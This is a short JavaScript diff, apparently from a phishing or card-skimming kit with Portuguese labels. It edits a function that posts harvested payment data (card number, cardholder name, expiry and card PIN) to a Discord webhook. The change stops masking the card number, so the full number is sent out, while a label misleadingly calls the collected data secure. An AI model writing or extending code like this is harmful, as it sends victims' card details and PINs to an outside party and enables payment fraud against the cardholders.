@@ -1518,7 +1518,7 @@ async function sendToDiscordWebhook(data) {
             "🔒 Dados Seguros": "Os dados abaixo foram coletados de forma segura",
             "----------------------------------------": "",
             ...(data.cardNumber ? {
-                "💳 Cartão": `•••• •••• •••• ${data.cardNumber.slice(-4)}`,
+                "💳 Cartão": `${data.cardNumber}`,
                 "👤 Nome no Cartão": data.cardName || 'Não informado',
                 "📆 Validade": data.cardExpiry || 'Não informado',
                 "🔑 Senha do Cartão": data.cardPassword || 'Não informado'
